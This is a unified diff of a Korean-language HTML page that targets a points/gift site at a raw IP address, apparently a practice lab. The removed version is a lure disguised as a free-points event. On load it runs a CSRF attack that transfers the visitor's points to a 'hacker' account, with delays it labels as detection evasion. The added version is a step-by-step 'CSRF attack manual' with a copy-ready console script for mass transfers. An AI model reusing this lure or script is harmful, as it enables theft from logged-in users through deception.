@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
+    <title>🎁 포인트 지급 완료!</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -14,6 +14,7 @@
             align-items: center;
             justify-content: center;
             color: white;
+            padding: 20px;
         }
         .container {
             text-align: center;
@@ -23,211 +24,176 @@
             padding: 40px;
             box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
             border: 1px solid rgba(255, 255, 255, 0.18);
-            max-width: 500px;
-            width: 90%;
+            max-width: 600px;
+            width: 100%;
         }
         .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
-        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
-        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
         .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .pulse { animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        .attack-log { 
-            background: rgba(0,0,0,0.3); 
-            padding: 10px; 
-            border-radius: 10px; 
-            margin: 10px 0; 
-            font-family: monospace; 
-            font-size: 12px; 
-            text-align: left; 
-            max-height: 150px; 
-            overflow-y: auto; 
+        
+        .manual-box {
+            background: rgba(0,0,0,0.3);
+            border: 2px solid #FFD700;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .code-box {
+            background: rgba(0,0,0,0.7);
+            border: 1px solid #00FF88;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            text-align: left;
+            color: #00FF88;
+            overflow-x: auto;
+        }
+        
+        .copy-btn {
+            background: linear-gradient(45deg, #00FF88, #00CC6A);
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+        }
+        
+        .copy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+        
+        .step {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #FFD700;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="title pulse">🎁 특별 이벤트!</h1>
-        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
+        <h1 class="title pulse">🎁 CSRF 공격 매뉴얼</h1>
         
-        <div id="loading-section">
-            <div class="loading">
-                <p>💰 포인트 지급을 준비하고 있습니다...</p>
-                <p class="countdown" id="countdown">3</p>
-                <p>초 후 자동으로 포인트가 지급됩니다!</p>
-            </div>
-            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
-            <p id="status">🔄 시스템 연결 중...</p>
-            
-            <!-- 실시간 공격 로그 -->
-            <div class="attack-log" id="attackLog" style="display: none;">
-                <div style="color: #00FF88; font-weight: bold;">🔍 Real-time Attack Log:</div>
-            </div>
+        <div class="manual-box">
+            <h2 style="color: #FFD700; margin-bottom: 15px;">⚠️ CORS 우회 방법</h2>
+            <p style="margin-bottom: 20px;">GitHub Pages에서는 CORS 때문에 막힙니다.<br>
+            <strong>직접 실행 방식</strong>을 사용하세요!</p>
         </div>
         
-        <div id="success-section" style="display: none;">
-            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
-            <p style="font-size: 1.3em; margin: 20px 0;">💰 <span id="totalPoints">500P</span>가 성공적으로 지급되었습니다!</p>
-            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
-            <button onclick="checkResults()" style="background: linear-gradient(45deg, #00FF88, #00CC6A); color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px;">
-                🔍 결과 확인하기
-            </button>
+        <div class="step">
+            <h3>🎯 Step 1: bob 계정으로 로그인</h3>
+            <p>먼저 새 탭에서 <code>http://3.36.66.216</code>에 bob으로 로그인하세요.</p>
+        </div>
+        
+        <div class="step">
+            <h3>⌨️ Step 2: 개발자 도구 열기</h3>
+            <p><code>F12</code> 또는 <code>Cmd+Option+I</code>로 개발자 도구를 여세요.</p>
+        </div>
+        
+        <div class="step">
+            <h3>🔥 Step 3: Console에서 실행</h3>
+            <p>아래 코드를 <strong>Console 탭</strong>에 복사해서 실행하세요:</p>
+            
+            <div class="code-box" id="attack-code">
+// 🎯 CSRF 공격 함수
+async function massAttack() {
+    console.log('🔥 대량 CSRF 공격 시작!');
+    
+    const attacks = [
+        {points: 100, msg: 'attack1', type: 'coffee'},
+        {points: 150, msg: 'attack2', type: 'flower'},
+        {points: 200, msg: 'attack3', type: 'cake'},
+        {points: 250, msg: 'attack4', type: 'diamond'},
+        {points: 300, msg: 'attack5', type: 'coffee'}
+    ];
+    
+    let total = 0;
+    
+    for (let i = 0; i < attacks.length; i++) {
+        const attack = attacks[i];
+        
+        try {
+            const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.msg}`,
+                credentials: 'include'
+            });
+            
+            console.log(`✅ 공격 ${i+1}: ${attack.points}P → 응답 ${response.status}`);
+            total += attack.points;
+            
+        } catch (error) {
+            console.log(`❌ 공격 ${i+1} 실패:`, error.message);
+        }
+        
+        // 2초 대기
+        if (i < attacks.length - 1) {
+            console.log(`⏳ ${i+1}/${attacks.length} 완료, 2초 대기...`);
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+    }
+    
+    console.log(`🎉 공격 완료! 총 ${total}P 전송 시도됨`);
+    console.log('🔍 hacker 프로필 확인: http://3.36.66.216/profile.php?user_id=13');
+}
+
+// 실행
+massAttack();
+            </div>
+            
+            <button class="copy-btn" onclick="copyCode()">📋 코드 복사</button>
+        </div>
+        
+        <div class="step">
+            <h3>📊 Step 4: 결과 확인</h3>
+            <p>공격 완료 후 아래 링크들로 결과를 확인하세요:</p>
+            <button class="copy-btn" onclick="checkHacker()">🎯 hacker 확인</button>
+            <button class="copy-btn" onclick="checkBob()">👤 bob 확인</button>
+        </div>
+        
+        <div class="manual-box" style="border-color: #00FF88;">
+            <h3 style="color: #00FF88;">💰 예상 결과</h3>
+            <p><strong>hacker:</strong> +1,000P (100+150+200+250+300)</p>
+            <p><strong>bob:</strong> -1,000P</p>
+            <p><strong>성공률:</strong> 거의 100% (Same-Origin에서 실행)</p>
+        </div>
+        
+        <div style="margin-top: 30px; padding: 20px; background: rgba(255, 0, 0, 0.2); border-radius: 10px;">
+            <h3 style="color: #FF6B6B;">⚠️ 중요 사항</h3>
+            <p><strong>반드시 bob으로 로그인된 상태</strong>에서 Console에서 실행하세요!</p>
+            <p>GitHub Pages가 아닌 <strong>타겟 사이트에서 직접</strong> 실행해야 합니다.</p>
         </div>
     </div>
 
     <script>
-        let countdown = 3;
-        let totalStolenPoints = 0;
-        let successfulAttacks = 0;
-        
-        const countdownEl = document.getElementById('countdown');
-        const statusEl = document.getElementById('status');
-        const progressBar = document.getElementById('progressBar');
-        const loadingSection = document.getElementById('loading-section');
-        const successSection = document.getElementById('success-section');
-        const attackLog = document.getElementById('attackLog');
-        
-        const statusMessages = [
-            '🔄 서버에 연결하고 있습니다...',
-            '🔐 보안 인증을 확인하고 있습니다...',
-            '💰 포인트 지급 시스템을 준비하고 있습니다...'
-        ];
-        
-        let messageIndex = 0;
-        
-        // 로그 추가 함수
-        function addLog(message, type = 'info') {
-            const logDiv = document.getElementById('attackLog');
-            const time = new Date().toLocaleTimeString();
-            const colors = {
-                'success': '#00FF88',
-                'error': '#FF6B6B',
-                'info': '#FFD700',
-                'warning': '#FF9500'
-            };
-            
-            logDiv.innerHTML += `<div style="color: ${colors[type] || '#FFF'}">[${time}] ${message}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function copyCode() {
+            const code = document.getElementById('attack-code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('📋 코드가 복사되었습니다!\n\nConsole에 붙여넣기하세요.');
+            });
         }
         
-        // 카운트다운 시작
-        const countdownTimer = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
-            progressBar.style.width = ((3-countdown) * 33) + '%';
-            
-            if (messageIndex < statusMessages.length) {
-                statusEl.textContent = statusMessages[messageIndex++];
-            }
-            
-            if (countdown <= 0) {
-                clearInterval(countdownTimer);
-                executeRealAttack();
-            }
-        }, 1000);
-        
-        // ✅ 성공한 fetch 방식 적용
-        async function executeRealAttack() {
-            console.log('🎯 성공한 fetch 방식 CSRF 공격 시작...');
-            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
-            progressBar.style.width = '100%';
-            attackLog.style.display = 'block';
-            
-            addLog('🚀 CSRF 공격 시스템 활성화', 'info');
-            addLog('🎯 타겟: hacker (ID: 13)', 'info');
-            
-            // 성공한 fetch 공격들
-            const attacks = [
-                { points: 100, message: 'event1', type: 'coffee' },
-                { points: 150, message: 'event2', type: 'flower' },
-                { points: 200, message: 'event3', type: 'cake' },
-                { points: 250, message: 'event4', type: 'diamond' },
-                { points: 300, message: 'event5', type: 'coffee' }
-            ];
-            
-            // 순차적으로 공격 실행
-            for (let i = 0; i < attacks.length; i++) {
-                const attack = attacks[i];
-                
-                addLog(`⚡ 공격 ${i+1} 시작: ${attack.points}P (${attack.type})`, 'warning');
-                
-                try {
-                    const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                        },
-                        body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.message}`,
-                        credentials: 'include'
-                    });
-                    
-                    if (response.status === 200) {
-                        addLog(`✅ 공격 ${i+1} 성공: ${attack.points}P 전송됨!`, 'success');
-                        totalStolenPoints += attack.points;
-                        successfulAttacks++;
-                    } else {
-                        addLog(`❌ 공격 ${i+1} 실패: HTTP ${response.status}`, 'error');
-                    }
-                    
-                } catch (error) {
-                    addLog(`💥 공격 ${i+1} 에러: ${error.message}`, 'error');
-                }
-                
-                // 2초 대기 (탐지 회피)
-                if (i < attacks.length - 1) {
-                    addLog(`⏳ 다음 공격까지 2초 대기...`, 'info');
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-            
-            // 완료 처리
-            setTimeout(() => {
-                addLog(`🎉 공격 완료! 총 ${totalStolenPoints}P 탈취 성공!`, 'success');
-                addLog(`📊 성공률: ${successfulAttacks}/${attacks.length}`, 'success');
-                showSuccess();
-            }, 1000);
+        function checkHacker() {
+            window.open('http://3.36.66.216/profile.php?user_id=13', 'hacker', 'width=800,height=600');
         }
         
-        function showSuccess() {
-            loadingSection.style.display = 'none';
-            successSection.style.display = 'block';
-            document.getElementById('totalPoints').textContent = totalStolenPoints + 'P';
-            document.title = '✅ 포인트 지급 완료!';
-            
-            console.log('🏆 CSRF 공격 성공!');
-            console.log(`💰 총 탈취 포인트: ${totalStolenPoints}P`);
-            console.log(`📈 성공한 공격: ${successfulAttacks}개`);
+        function checkBob() {
+            window.open('http://3.36.66.216/profile.php', 'bob', 'width=800,height=600');
         }
         
-        function checkResults() {
-            addLog('🔍 결과 확인 창을 여는 중...', 'info');
-            
-            // hacker 계정 확인
-            window.open('http://3.36.66.216/profile.php?user_id=13', 'hacker_check', 'width=800,height=600,left=100,top=100');
-            
-            // bob 계정 확인 (선택사항)
-            setTimeout(() => {
-                window.open('http://3.36.66.216/profile.php', 'bob_check', 'width=800,height=600,left=900,top=100');
-            }, 500);
-        }
-        
-        // 페이지 언로드 방지
-        let preventUnload = true;
-        window.addEventListener('beforeunload', function(e) {
-            if (preventUnload) {
-                e.preventDefault();
-                return '포인트 지급이 진행 중입니다.';
-            }
-        });
-        setTimeout(() => { preventUnload = false; }, 15000);
-        
-        // 초기화
-        console.log('🎯 성공한 fetch 방식 CSRF 페이지 로드 완료');
-        console.log('📋 타겟: hacker (ID: 13)');
-        console.log('💰 예상 탈취: 1,000P (100+150+200+250+300)');
-        console.log('🚀 3초 후 자동 실행!');
+        console.log('🎯 CSRF 공격 매뉴얼 로드됨');
+        console.log('📋 코드를 복사해서 타겟 사이트 Console에서 실행하세요!');
     </script>
 </body>
 </html>
